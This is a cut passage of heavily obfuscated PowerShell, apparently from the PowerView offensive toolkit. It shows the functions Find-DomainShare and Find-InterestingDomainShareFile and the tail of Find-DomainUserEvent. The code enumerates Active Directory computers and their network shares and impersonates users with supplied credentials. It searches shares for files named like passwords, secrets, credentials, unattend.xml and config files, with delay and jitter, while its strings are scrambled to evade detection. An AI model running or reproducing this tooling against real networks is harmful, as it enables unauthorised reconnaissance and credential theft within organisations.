                ${rEs`U`lT} = &("{0}{2}{1}{3}" -f'I','voke-Comma','n','nd') -ScriptBlock ${H`OS`T`ENUm`BlocK} -ArgumentList ${t`ARg`eTComPu`T`Er}, ${sT`ArTt`iME}, ${e`NDt`Ime}, ${mAxEVe`N`TS}, ${tA`RGE`TUsE`RS}, ${FI`lteR}, ${cR`Ed`ent`iAl}
                ${r`E`Sult}

                if (${RE`sUlt} -and ${StopON`sUcc`E`sS}) {
                    &("{0}{3}{1}{2}"-f 'W','e-Ve','rbose','rit') ("{9}{1}{3}{5}{6}{0}{8}{10}{2}{4}{14}{11}{13}{12}{7}"-f've','d-D','r','omain',' fo','Us','erE','y','nt] Target u','[Fin','se','rnin','rl','g ea','und, retu')
                    return
                }
            }
        }
        else {
            &("{0}{1}{3}{2}"-f'W','ri','rbose','te-Ve') ('[Fi'+'n'+'d'+'-Domain'+'Us'+'erEvent]'+' '+'U'+'s'+'ing '+'t'+'h'+'reading '+'wi'+'th '+'thre'+'ads: '+"$Threads")

            
            ${SC`R`iPT`P`ARAMs} = @{
                ("{1}{2}{0}" -f'me','Star','tTi') = ${St`A`RTTimE}
                ("{1}{0}" -f 'ime','EndT') = ${en`D`TIMe}
                ("{2}{1}{0}"-f'ents','xEv','Ma') = ${m`Axe`Ve`NTS}
                ("{0}{1}{2}"-f'Targe','tUse','rs') = ${tA`R`GeTUsE`RS}
                ("{0}{1}" -f'Fil','ter') = ${F`Ilt`eR}
                ("{0}{1}{2}" -f 'Cred','ent','ial') = ${cRED`EntI`AL}
            }

            
            &("{4}{0}{1}{2}{5}{3}"-f'ew','-Thr','eadedFun','tion','N','c') -ComputerName ${ta`R`g`EtcOm`PuteRS} -ScriptBlock ${HoSt`eN`U`mbLOCK} -ScriptParameters ${ScrIP`TP`A`RAMs} -Threads ${Th`Re`AdS}
        }
    }
}


function fIND-D`o`mAiN`Sh`ArE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}" -f'SShouldProc','P','ess'}, '')]
    [OutputType({"{0}{1}{2}{3}"-f'P','o','werView.S','hareInfo'})]
    Param(
        [Parameter(PosItiON = 0, valUefrOmpipelIne = ${Tr`UE}, VaLUeFroMpipelINeByprOpErTYName = ${tR`UE})]
        [Alias({"{1}{2}{0}"-f 'ame','DN','SHostN'})]
        [String[]]
        ${COMpUT`ER`NAmE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'in','Doma'})]
        [String]
        ${CoMputE`R`D`OmaIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOmPUTER`l`dApF`i`LtEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOM`putERSeA`RC`h`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}" -f'in','Opera','gSystem','t'})]
        [String]
        ${co`MP`UtE`R`OPE`RAtiNgSys`Tem},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}" -f 'P','Serv','ice','ack'})]
        [String]
        ${CoM`P`UTeRSE`RVI`cEPaCK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'me','teNa','Si'})]
        [String]
        ${C`omp`UTeR`Si`TEnAME},

        [Alias({"{2}{0}{1}"-f's','s','CheckAcce'})]
        [Switch]
        ${Ch`ECKSH`AREac`CesS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{1}{3}{2}"-f 'Doma','Con','er','troll','in'})]
        [String]
        ${S`e`RvER},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{2}{0}"-f 'el','OneLe','v'}, {"{0}{1}" -f'Subt','ree'})]
        [String]
        ${s`eArChSC`O`PE} = ("{0}{1}{2}"-f 'S','ubtr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eS`UltpAGeSi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`RVe`Rt`ImELIMiT},

        [Switch]
        ${T`O`MBst`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crED`eN`Ti`AL} =   (GI vaRiABLE:21Gv7E ).VALuE::"em`pTY",

        [ValidateRange(1, 10000)]
        [Int]
        ${d`ElaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jIT`T`ER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${ThREA`DS} = 20
    )

    BEGIN {

        ${COMPuT`e`RSearc`hErAR`g`UmenTs} = @{
            ("{0}{2}{1}"-f'P','ies','ropert') = ("{1}{0}{2}" -f'host','dns','name')
        }
        if (${pS`BO`Un`DPara`MEtErs}[("{2}{1}{0}{3}" -f 'oma','mputerD','Co','in')]) { ${CO`mputerseARc`h`eRar`gUmenTs}[("{1}{0}"-f'omain','D')] = ${COm`pUteR`D`oMaiN} }
        if (${PSBo`UN`DpaRa`me`Ters}[("{4}{3}{2}{1}{0}"-f'r','ilte','F','P','ComputerLDA')]) { ${co`M`Pu`Ter`SEa`RCHE`RAr`gUM`EnTS}[("{0}{1}{3}{2}"-f 'L','DAPFil','r','te')] = ${Co`mpu`Terl`DapfiLTEr} }
        if (${psBO`UnDpAraM`Ete`RS}[("{2}{0}{1}{3}" -f 'put','e','Com','rSearchBase')]) { ${cOmpuTErS`ea`Rc`Her`ARGuM`ENTS}[("{2}{0}{1}"-f'a','se','SearchB')] = ${coMPUTer`S`EArchBA`sE} }
        if (${PsBOU`NdpAR`AM`eTe`Rs}[("{1}{0}{3}{2}" -f 'constra','Un','ed','in')]) { ${c`OMPUtEr`sEA`RcH`eRARGUmEn`TS}[("{3}{1}{0}{2}"-f 'ne','nconstrai','d','U')] = ${UNCoNst`R`AIN`ed} }
        if (${p`sBoU`NdPAR`AMETe`RS}[("{0}{4}{2}{3}{1}{5}" -f'Comp','atingS','p','er','uterO','ystem')]) { ${COMpUt`eRsEaRCH`e`R`ARguMeNTs}[("{1}{3}{2}{0}{4}"-f 's','Opera','Sy','ting','tem')] = ${O`P`eRatING`SYstEm} }
        if (${psBo`UndparaM`E`TErs}[("{1}{4}{2}{0}{3}"-f 'ePac','Comp','terServic','k','u')]) { ${c`O`MPuTERsE`ARch`er`A`Rgu`mENtS}[("{0}{1}{2}" -f 'S','ervi','cePack')] = ${SE`RVICEPA`cK} }
        if (${p`SbOu`N`DpaRamE`TeRS}[("{0}{1}{4}{3}{2}" -f'Com','pute','eName','t','rSi')]) { ${CO`mp`UTERSeARCH`ErarGU`MenTS}[("{0}{2}{1}" -f 'S','teName','i')] = ${SI`T`eName} }
        if (${PsbOu`NdpA`R`AMETeRS}[("{1}{0}{2}" -f 'er','S','ver')]) { ${CoMpute`Rs`Ea`Rch`eraRg`UmeN`Ts}[("{0}{1}{2}"-f'Ser','ve','r')] = ${sE`RVer} }
        if (${ps`Bo`UndPa`RaM`ETeRS}[("{0}{1}{2}" -f 'S','earchSco','pe')]) { ${compUt`e`RSE`Arc`hE`RArGu`MeNTS}[("{3}{2}{0}{1}"-f 'op','e','Sc','Search')] = ${s`EARc`hscoPe} }
        if (${Ps`BoU`NdPA`RaMet`e`Rs}[("{3}{0}{4}{1}{2}" -f 'esu','e','Size','R','ltPag')]) { ${COm`puteR`S`EArCh`e`RarGumEnTS}[("{0}{2}{1}"-f'Result','geSize','Pa')] = ${RES`UlT`pagE`SizE} }
        if (${Ps`BouN`DPA`RAM`Ete`RS}[("{2}{4}{1}{0}{3}" -f'i','Lim','Serv','t','erTime')]) { ${c`o`MpuT`e`RseA`RchE`RA`R`gUmENts}[("{1}{0}{2}" -f 'i','ServerTimeLim','t')] = ${se`RV`ErTIm`eli`mIT} }
        if (${psbO`UnDpARAm`E`TE`RS}[("{0}{1}"-f 'Tom','bstone')]) { ${C`OMPUTE`Rse`ArcHErA`RGum`eNTs}[("{0}{1}{2}"-f 'Tombs','to','ne')] = ${tOmbs`T`onE} }
        if (${PS`BO`UndpARameT`ERS}[("{0}{1}{2}"-f'Cr','eden','tial')]) { ${c`O`Mp`UTERs`E`ARCheRArgU`Men`Ts}[("{2}{1}{0}"-f 'al','nti','Crede')] = ${c`ReD`E`NTiAl} }

        if (${Ps`BoUN`DP`A`RaMEtERS}[("{2}{3}{1}{0}"-f 'e','am','Co','mputerN')]) {
            ${tAR`gETcom`PUT`ErS} = ${CompU`TeR`NAME}
        }
        else {
            &("{0}{1}{3}{2}"-f 'Writ','e-V','e','erbos') ("{0}{1}{8}{6}{9}{7}{2}{12}{4}{10}{3}{5}{11}"-f '[Find-Do','m','o','n the','puters',' doma','i','Querying c','a','nShare] ',' i','in','m')
            ${T`AR`GEt`CO`MPUTeRs} = &("{0}{3}{2}{1}{4}"-f 'Get','a','Dom','-','inComputer') @ComputerSearcherArguments | &("{0}{3}{2}{4}{1}"-f 'Sele','ct','-','ct','Obje') -ExpandProperty ("{2}{1}{3}{0}"-f 'e','sh','dn','ostnam')
        }
        &("{3}{1}{0}{2}"-f'e','-V','rbose','Write') "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length) "
        if (${TARg`ETcO`mpU`TE`RS}."LE`N`gTH" -eq 0) {
            throw ("{0}{1}{3}{7}{2}{6}{4}{8}{5}"-f'[Fi','nd-Do','re] No hosts f','m',' e','erate','ound to','ainSha','num')
        }

        
        ${h`osT`ENUmB`LOck} = {
            Param(${CoMPU`T`eR`NAMe}, ${c`HeCK`s`hARE`ACCESs}, ${TO`Kenh`A`NDLe})

            if (${toke`NH`ANdle}) {
                
                ${n`Ull} = &("{4}{3}{1}{2}{0}" -f'tion','-UserImp','ersona','oke','Inv') -TokenHandle ${To`KeNHA`Ndle} -Quiet
            }

            ForEach (${T`ARGEt`c`ompUTeR} in ${COMPU`TE`RnAme}) {
                ${U`p} = &("{2}{0}{1}{3}{4}"-f 'e','st-','T','Conne','ction') -Count 1 -Quiet -ComputerName ${ta`Rg`e`TcomPUtER}
                if (${u`p}) {
                    
                    ${S`HAres} = &("{3}{0}{1}{2}"-f'et','-NetSh','are','G') -ComputerName ${TaRGE`TcO`mp`Ut`eR}
                    ForEach (${S`HAre} in ${ShA`Res}) {
                        ${SHa`R`EnaMe} = ${S`HarE}."nA`mE"
                        
                        ${p`ATH} = '\\'+${T`ArGEtCo`M`pUTer}+'\'+${S`hAreNA`me}

                        if ((${s`h`ArenAME}) -and (${S`hA`ReNa`Me}.("{0}{1}" -f 't','rim').Invoke() -ne '')) {
                            
                            if (${ch`Eck`sh`Ar`eaCCeSS}) {
                                
                                try {
                                    ${Nu`Ll} =  $axy1f::("{0}{1}"-f 'Get','Files').Invoke(${P`AtH})
                                    ${s`hArE}
                                }
                                catch {
                                    &("{3}{1}{0}{2}"-f 'Ver','-','bose','Write') ('Err'+'or'+' '+'acces'+'s'+'ing '+'sha'+'re '+'path'+' '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ${S`ha`RE}
                            }
                        }
                    }
                }
            }

            if (${T`oke`NhAnd`le}) {
                &("{2}{5}{1}{3}{0}{4}"-f'tTo','Re','Invo','ver','Self','ke-')
            }
        }

        ${LOGOn`TO`k`eN} = ${NU`Ll}
        if (${Ps`BOuNDP`A`RAme`T`erS}[("{2}{3}{1}{0}"-f 'al','denti','Cr','e')]) {
            if (${ps`BOu`NDp`ArAme`TE`Rs}[("{0}{1}"-f 'De','lay')] -or ${psBO`U`NdParAM`et`ERS}[("{1}{0}{3}{2}" -f 'opOn','St','ss','Succe')]) {
                ${LOgoN`T`o`KEn} = &("{0}{1}{4}{2}{3}{5}"-f 'In','vo','e-','UserImpersona','k','tion') -Credential ${cREDE`Nt`iAL}
            }
            else {
                ${lO`go`NTOk`EN} = &("{4}{2}{3}{0}{1}" -f 'rImper','sonation','vo','ke-Use','In') -Credential ${CR`eDe`NTIaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PsbO`U`ND`PArAmET`ErS}[("{1}{0}"-f 'lay','De')] -or ${PsbOu`NdparaM`e`TerS}[("{4}{0}{1}{2}{3}"-f'pO','nS','ucc','ess','Sto')]) {

            &("{1}{0}{2}"-f'rite','W','-Verbose') "[Find-DomainShare] Total number of hosts: $($TargetComputers.count) "
            &("{0}{4}{3}{1}{2}" -f'W','-Verb','ose','ite','r') ('[Fin'+'d-Domain'+'S'+'har'+'e] '+'Delay:'+' '+"$Delay, "+'Jit'+'t'+'er: '+"$Jitter")
            ${CoU`N`TER} = 0
            ${RaND`NO} = &("{1}{2}{0}" -f 'ct','New-Obj','e') ("{2}{0}{1}{3}" -f'stem.Rand','o','Sy','m')

            ForEach (${T`ARGe`T`CoMPU`Ter} in ${TARgeT`Co`m`PUtERs}) {
                ${cOU`NT`eR} = ${c`O`UnTer} + 1

                
                &("{1}{2}{3}{0}" -f 'ep','Sta','rt-Sl','e') -Seconds ${raN`dNo}.("{0}{1}" -f'Ne','xt').Invoke((1-${J`ittER})*${DeL`Ay}, (1+${J`ITtER})*${d`Elay})

                &("{1}{2}{0}{3}"-f 'Ve','Wri','te-','rbose') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{2}{4}{0}{3}" -f'omman','Inv','oke-','d','C') -ScriptBlock ${hoST`EN`Um`BlOcK} -ArgumentList ${taR`g`ETC`OmPUTEr}, ${che`C`KShAre`ACCE`SS}, ${Log`o`NtoK`EN}
            }
        }
        else {
            &("{2}{3}{0}{1}"-f'erb','ose','Write-','V') ('[F'+'ind-'+'Dom'+'a'+'inShare] '+'Us'+'ing'+' '+'th'+'re'+'a'+'ding '+'w'+'ith '+'t'+'hr'+'eads'+': '+"$Threads")

            
            ${Scr`IPt`PARaMs} = @{
                ("{0}{1}{3}{2}"-f'Che','ckShare','ess','Acc') = ${cHe`C`kShAR`e`ACCeSs}
                ("{2}{1}{0}{3}"-f'ndl','Ha','Token','e') = ${LOG`OnT`oken}
            }

            
            &("{4}{1}{0}{3}{2}" -f'eaded','-Thr','n','Functio','New') -ComputerName ${T`ArGetc`oMPU`TE`Rs} -ScriptBlock ${hO`S`TeNumBlOCK} -ScriptParameters ${SCr`IpT`paR`AMs} -Threads ${t`hREadS}
        }
    }

    END {
        if (${L`OgONtO`K`en}) {
            &("{4}{0}{2}{5}{3}{1}"-f'vok','lf','e-Revert','oSe','In','T') -TokenHandle ${LoGON`To`K`EN}
        }
    }
}


function FInD-`i`NTerEs`TIN`Gdo`MAins`hA`ReF`iLe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{4}{2}" -f 'ro','P','ess','PSShould','c'}, '')]
    [OutputType({"{3}{1}{2}{4}{0}"-f'e','iew','.Fou','PowerV','ndFil'})]
    [CmdletBinding(dEfAULTpArAMeteRsetNamE = {"{0}{2}{3}{1}" -f 'Fi','n','leS','pecificatio'})]
    Param(
        [Parameter(poSiTIoN = 0, VAlUefroMpIpelInE = ${t`RUE}, vAlueFroMPipeLINeBYPrOpErTYnaME = ${tR`UE})]
        [Alias({"{0}{3}{2}{1}"-f 'DN','ame','HostN','S'})]
        [String[]]
        ${ComPU`TE`R`NAMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${comPu`TE`Rd`Omain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${comPuteR`LD`AP`F`ilt`er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cO`MPuTEr`sEAr`c`Hba`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{0}{2}{4}" -f'ingS','rat','yst','Ope','em'})]
        [String]
        ${cOMPut`ERO`pEra`TIn`gSYstEm},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}" -f 'ack','r','Se','viceP'})]
        [String]
        ${coMP`U`Ters`eRViCE`pACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'Site','e','Nam'})]
        [String]
        ${cOM`PuterSitEN`A`me},

        [Parameter(pARAMETErsetNAme = "Fi`L`Es`peC`IficaTi`On")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'rch','Sea','Terms'}, {"{0}{1}" -f 'Te','rms'})]
        [String[]]
        ${iNc`lUdE} = @(("{2}{1}{0}"-f'sword*','pas','*'), ("{2}{0}{1}" -f 'nsit','ive*','*se'), ("{2}{1}{0}" -f 'in*','dm','*a'), ("{0}{1}"-f '*l','ogin*'), ("{2}{0}{1}" -f 'se','cret*','*'), ("{1}{0}{2}" -f'ttend*','una','.xml'), ("{1}{0}"-f'k','*.vmd'), ("{0}{1}{2}" -f '*cr','ed','s*'), ("{1}{2}{0}" -f 'l*','*cred','entia'), ("{2}{1}{0}"-f 'ig','f','*.con')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern({(("{0}{3}{4}{1}{2}" -f '{0}','{0','}{0}','{','0}')) -f [ChaR]92})]
        [Alias({"{1}{0}" -f'e','Shar'})]
        [String[]]
        ${sH`ARep`ATH},

        [String[]]
        ${Ex`cL`UDed`sH`ArES} = @('C$', ((('Admin'+'1'+'q0')-rEPlace ([CHAR]49+[CHAR]113+[CHAR]48),[CHAR]36)), ((('Pr'+'i'+'nt'+'vUm')-CrePlAcE ([ChAR]118+[ChAR]85+[ChAR]109),[ChAR]36)), (('IPCdHY')."rePL`Ace"('dHY',[stRiNG][CHaR]36))),

        [Parameter(parAmETERSEtNaME = "FilE`sPeC`IFI`caTIOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${La`sTAcCeSsTI`me},

        [Parameter(ParaMEtERSEtnamE = "FIL`EsPEc`ifiCAtI`on")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${lA`Stw`RI`T`ETiME},

        [Parameter(PAraMEtERSEtNaMe = "fiLeSpeC`If`ic`A`TiON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${cR`EA`TIoNtIme},

        [Parameter(PaRAmeTERSEtNaMe = "Of`FICeD`OCS")]
        [Switch]
        ${Off`i`cedocs},

        [Parameter(PAraMetErSETNamE = "frEsh`EX`ES")]
        [Switch]
        ${f`REsh`ex`es},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f'nController','ai','D','om'})]
        [String]
        ${S`e`RVeR},

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{1}{0}"-f 'evel','OneL'}, {"{2}{0}{1}" -f'e','e','Subtr'})]
        [String]
        ${sEArCH`SC`o`pE} = ("{1}{0}" -f'btree','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSuL`TPAgES`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VE`RtiMeL`i`mit},

        [Switch]
        ${ToM`Bs`T`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdENti`AL} =   $21gv7e::"e`mPTY",

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`l`Ay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JI`TteR} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${THRe`A`dS} = 20
    )

    BEGIN {
        ${CO`MpuTER`s`EaRCheraRGu`me`N`Ts} = @{
            ("{1}{2}{0}"-f 'ies','Proper','t') = ("{0}{2}{1}"-f 'dnshost','ame','n')
        }
        if (${p`sbO`Un`DPa`RAMEtErS}[("{4}{2}{1}{3}{0}" -f 'main','erD','t','o','Compu')]) { ${ComP`UteRSe`ARChEra`R`gu`MenTs}[("{1}{2}{0}" -f'n','Do','mai')] = ${COMpU`TErd`oMA`iN} }
        if (${PS`Bo`U`Ndpar`AmeTERs}[("{2}{1}{3}{0}" -f'r','APFi','ComputerLD','lte')]) { ${COmp`UT`ersea`RCHeRArgU`MeNTs}[("{3}{0}{1}{2}" -f 'APFil','te','r','LD')] = ${coM`P`Ut`erLd`A`pfILter} }
        if (${p`sbo`UndpARAmE`TE`RS}[("{3}{2}{0}{4}{1}"-f 'Search','se','er','Comput','Ba')]) { ${Co`mpUteRS`E`ARCHER`A`RGum`eNts}[("{2}{0}{1}"-f 'chBas','e','Sear')] = ${cOMPuTe`RsEaR`c`HBAse} }
        if (${P`sB`ouNDparA`mETERS}[("{0}{5}{1}{3}{2}{7}{6}{4}" -f 'Co','p','Sy','uterOperating','m','m','e','st')]) { ${cOMPU`TE`RSEaRc`h`erA`RgumE`NtS}[("{2}{3}{0}{1}" -f'tingSyst','em','O','pera')] = ${oPE`R`AtINg`SYST`Em} }
        if (${p`s`Bo`UNdpAramEt`e`Rs}[("{1}{0}{3}{2}" -f 'Ser','Computer','ePack','vic')]) { ${c`OMPuTEr`SeAR`cHeR`ARguM`ENTs}[("{0}{2}{1}" -f'S','ePack','ervic')] = ${SER`VIcepa`Ck} }
        if (${psB`o`Un`D`PAramET`eRS}[("{3}{1}{0}{2}"-f'eN','mputerSit','ame','Co')]) { ${co`mPUtERSEA`RC`he`R`ARg`UM`ENTs}[("{0}{1}" -f 'S','iteName')] = ${SI`T`e`NAMe} }
        if (${Ps`BOuN`dpArA`MetE`RS}[("{1}{0}" -f'r','Serve')]) { ${COmpUtERSEaRchERArG`UM`E`N`Ts}[("{0}{1}"-f'Se','rver')] = ${SeRV`Er} }
        if (${psb`OuNDpar`AMe`TeRs}[("{2}{1}{0}"-f'pe','o','SearchSc')]) { ${comPU`TErsE`ARCh`ErA`RgUm`ENTS}[("{0}{1}{2}"-f'Sea','rch','Scope')] = ${SEarC`hs`C`oPe} }
        if (${P`sB`ouN`DPAram`e`TERs}[("{2}{3}{0}{1}{4}"-f'u','ltPageS','R','es','ize')]) { ${Co`mpUtER`SE`ARcherA`RG`UMe`NTs}[("{3}{1}{0}{2}" -f 'g','Pa','eSize','Result')] = ${Res`U`l`TPAGeSIZE} }
        if (${p`sBoU`NDp`Ar`AMe`TERS}[("{1}{4}{0}{3}{2}"-f 'T','Serv','meLimit','i','er')]) { ${CoMpU`T`ErseA`RCHerarG`U`m`eNTs}[("{2}{1}{3}{4}{0}"-f 'mit','er','S','verTim','eLi')] = ${sErVe`Rt`iMe`lIM`it} }
        if (${P`sB`OundPA`R`AMETERS}[("{1}{0}{2}" -f 'mbst','To','one')]) { ${C`OM`PuTeRS`earCHerar`g`U`M`eNts}[("{1}{0}{3}{2}"-f 'bs','Tom','ne','to')] = ${t`OMBst`oNe} }
        if (${pSbOuN`D`ParAME`TERs}[("{1}{2}{0}" -f 'l','Cred','entia')]) { ${cO`mPUTerSe`ARChEr`A`RG`UMEn`Ts}[("{0}{1}{2}" -f 'Cr','eden','tial')] = ${CRE`d`E`NtiAl} }

        if (${p`SbounD`paRAmET`erS}[("{2}{0}{1}"-f 'puterNa','me','Com')]) {
            ${tA`RGETCo`m`Pu`TErS} = ${ComPUt`er`N`AME}
        }
        else {
            &("{2}{0}{3}{1}"-f '-','ose','Write','Verb') ("{8}{12}{2}{13}{4}{6}{0}{15}{14}{1}{9}{3}{11}{10}{7}{5}{16}" -f '] Q','i','tingD','g','i','doma','le','e ','[F','n','ers in th',' comput','ind-Interes','omainShareF','y','uer','in')
            ${T`A`RgETcoM`PUtE`Rs} = &("{2}{4}{3}{0}{1}" -f'p','uter','Get-','omainCom','D') @ComputerSearcherArguments | &("{1}{3}{0}{2}"-f 'ct','Sel','-Object','e') -ExpandProperty ("{1}{0}{3}{2}"-f'n','d','me','shostna')
        }
        &("{2}{3}{1}{0}"-f'bose','-Ver','Wri','te') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if (${T`ArgEtCo`m`PUte`RS}."L`en`GtH" -eq 0) {
            throw ("{7}{1}{17}{10}{0}{18}{6}{11}{9}{15}{5}{12}{8}{14}{16}{2}{3}{13}{4}"-f'I','Fi',' f','oun','umerate','mainShareF','er','[','] ','n','d-','esti','ile','d to en','No hos','gDo','ts','n','nt')
        }

        
        ${hO`ste`NuMBlo`Ck} = {
            Param(${C`OMPutER`N`AMe}, ${I`N`cLuDE}, ${Ex`c`l`UdEDsHar`eS}, ${o`FFi`CE`doCs}, ${Ex`C`luD`EhId`dEN}, ${fr`esHE`X`eS}, ${C`h`EckW`RItEaC`C`ESs}, ${to`KeNhAn`dlE})

            if (${t`OKENHan`Dle}) {
                
                ${N`ULL} = &("{2}{3}{4}{1}{0}"-f'rsonation','rImpe','Invo','ke','-Use') -TokenHandle ${tokEn`Ha`Ndle} -Quiet
            }

            ForEach (${T`Ar`gETc`OMpU`Ter} in ${c`O`m`pUTerN`AMe}) {

                ${SeAR`c`H`ShAres} = @()
                if (${TaR`getC`omp`U`TER}.("{3}{1}{2}{0}" -f'sWith','a','rt','St').Invoke('\\')) {
                    
                    ${Se`AR`CHs`Hares} += ${TaRge`Tc`o`mpuTER}
                }
                else {
                    ${u`P} = &("{0}{3}{2}{1}"-f'Te','tion','Connec','st-') -Count 1 -Quiet -ComputerName ${tAr`geTco`m`Put`eR}
                    if (${U`p}) {
                        
                        ${SHar`es} = &("{2}{0}{3}{1}"-f'tS','re','Get-Ne','ha') -ComputerName ${t`ArG`EtcOMpUt`eR}
                        ForEach (${S`h`ARE} in ${Sh`Ar`eS}) {
                            ${SH`AReN`A`Me} = ${ShA`RE}."Na`Me"
                            ${pa`TH} = '\\'+${taRGet`C`o`m`PUtEr}+'\'+${SHa`R`EnaMe}
                            
                            if ((${sh`ARe`NAMe}) -and (${S`har`ENA`mE}.("{1}{0}" -f 'm','Tri').Invoke() -ne '')) {
                                
                                if (${EX`CluDEd`S`Ha`Res} -NotContains ${SHaRE`N`AME}) {
                                    
                                    try {
                                        ${nu`Ll} =  $AxY1F::("{0}{1}"-f 'Get','Files').Invoke(${pa`TH})
                                        ${SE`Arc`HSHArES} += ${P`ATH}
                                    }
                                    catch {
                                        &("{1}{3}{2}{0}" -f'ose','Write-','b','Ver') ('[!'+'] '+'N'+'o '+'access'+' '+'t'+'o '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach (${ShA`RE} in ${SEa`RC`HSH`A`ReS}) {
                    &("{2}{3}{0}{1}" -f'e-Ve','rbose','Wr','it') ('Sea'+'r'+'chin'+'g '+'sh'+'a'+'re: '+"$Share")
                    ${sea`RCH`A`RGs} = @{
                        ("{0}{1}" -f'Pat','h') = ${s`h`Are}
                        ("{0}{1}"-f'I','nclude') = ${iN`C`LUdE}
                    }
                    if (${O`FfIc`e`doCs}) {
                        ${Se`ArchA`RGS}[("{1}{0}{2}" -f 'D','Office','ocs')] = ${oFf`iCed`oCS}
                    }
                    if (${fREsh`E`XeS}) {
                        ${s`eARchA`RgS}[("{0}{1}"-f'F','reshEXEs')] = ${f`R`e`sheXES}
                    }
                    if (${LAsta`CceS`sTi`me}) {
                        ${sea`Rc`harGs}[("{2}{4}{3}{1}{0}" -f 'me','ccessTi','L','A','ast')] = ${L`AST`Acc`EssTI`Me}
                    }
                    if (${lAS`TWRI`T`EtIme}) {
                        ${s`EarCHa`Rgs}[("{1}{2}{0}{3}" -f 'it','Last','Wr','eTime')] = ${L`Ast`Wr`ITE`TiMe}
                    }
                    if (${CreA`T`ionTiME}) {
                        ${sEAr`Ch`Ar`Gs}[("{1}{0}{2}" -f'T','Creation','ime')] = ${crE`ATION`T`IME}
                    }
                    if (${chEcKWR`I`TEA`C`cESS}) {
                        ${sE`Ar`CHAR`GS}[("{0}{2}{1}{3}" -f'Check','riteAcces','W','s')] = ${chEcK`w`R`iTEAcce`Ss}
                    }
                    &("{4}{5}{0}{2}{1}{3}"-f'nteres','Fi','ting','le','Find-','I') @SearchArgs
                }
            }

            if (${T`okE`NHAND`LE}) {
                &("{0}{2}{5}{3}{1}{4}"-f 'Invo','rtT','ke-R','e','oSelf','ev')
            }
        }

        ${LOGO`N`TokeN} = ${NU`Ll}
        if (${PSBOU`N`DP`ArAmete`RS}[("{3}{0}{1}{2}"-f 't','ia','l','Creden')]) {
            if (${p`SboUNDpAram`e`TErs}[("{0}{1}" -f'Del','ay')] -or ${PsBO`U`N`dpaRAmEtErs}[("{1}{0}{2}{3}" -f 'p','Sto','OnSucc','ess')]) {
                ${LOG`on`TOKEN} = &("{3}{1}{4}{2}{0}{5}"-f 'o','e-','Impersonati','Invok','User','n') -Credential ${c`RE`denTi`Al}
            }
            else {
                ${loG`oNt`okEN} = &("{5}{3}{2}{4}{1}{0}" -f 'n','o','Us','voke-','erImpersonati','In') -Credential ${C`ReDEn`T`ial} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${P`S`B`oUN`dPaRAme`TerS}[("{1}{0}" -f'y','Dela')] -or ${PSb`OunD`Pa`Ra`mEte`Rs}[("{2}{1}{0}"-f'pOnSuccess','o','St')]) {

            &("{0}{2}{1}"-f'Write-','ose','Verb') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &("{0}{2}{1}"-f'Wri','e-Verbose','t') ('[Fi'+'nd-Int'+'e'+'r'+'esti'+'ngDoma'+'i'+'nShareFile] '+'Dela'+'y'+': '+"$Delay, "+'Jit'+'te'+'r: '+"$Jitter")
            ${c`o`UNtER} = 0
            ${rA`NDnO} = &("{1}{3}{2}{0}" -f 't','N','Objec','ew-') ("{0}{1}{2}" -f'Sy','s','tem.Random')

            ForEach (${tAr`getC`oMputER} in ${T`ARG`ETComP`U`TERS}) {
                ${c`OUNt`ER} = ${Co`UnT`Er} + 1

                
                &("{0}{2}{1}" -f 'S','p','tart-Slee') -Seconds ${ra`Nd`No}.("{0}{1}"-f 'Nex','t').Invoke((1-${JIT`TeR})*${D`E`lay}, (1+${J`I`TTEr})*${d`elAY})

                &("{2}{1}{3}{0}" -f'rbose','e','Writ','-Ve') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
